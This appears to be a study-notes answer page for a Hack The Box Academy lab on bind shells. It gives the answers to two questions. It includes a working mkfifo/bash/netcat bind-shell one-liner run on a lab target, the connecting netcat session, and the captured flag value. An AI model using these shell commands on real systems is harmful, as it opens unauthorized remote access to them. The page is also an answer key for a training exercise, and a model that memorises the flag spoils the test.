# Section 04: Bind Shells

Module: 08. Shells & Payloads

---

## Questions & Answers

### 1. Des is able to issue the command nc -lvnp 443 on a Linux target. What port will she need to connect to from her attack box to successfully establish a shell session?

**Answer:** `443`

---

### 2. SSH to the target, create a bind shell, then use netcat to connect to the target using the bind shell you set up. When you have completed the exercise, submit the contents of the flag.txt file located at /customscripts.

Context:
On server terminal:
```bash
htb-student@ubuntu:~$ rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -l 10.129.201.134 7777 > /tmp/f
```
On Pwnbox:
```bash
┌─[eu-academy-1]─[10.10.15.177]─[htb-ac-2162140@htb-krw6dyt2ty]─[~]
└──╼ [★]$ nc -nv 10.129.201.134 7777
Connection to 10.129.201.134 7777 port [tcp/*] succeeded!
htb-student@ubuntu:~$ id
id
uid=1001(htb-student) gid=1001(htb-student) groups=1001(htb-student),27(sudo)
htb-student@ubuntu:~$ ls /customscripts
ls /customscripts
flag.txt
htb-student@ubuntu:~$ cat /customscripts/flag.txt
cat /customscripts/flag.txt
B1nD_Shells_r_cool
htb-student@ubuntu:~$ 
```

**Answer:** `B1nD_Shells_r_cool`

---

[Back to Module Index](./README.md)
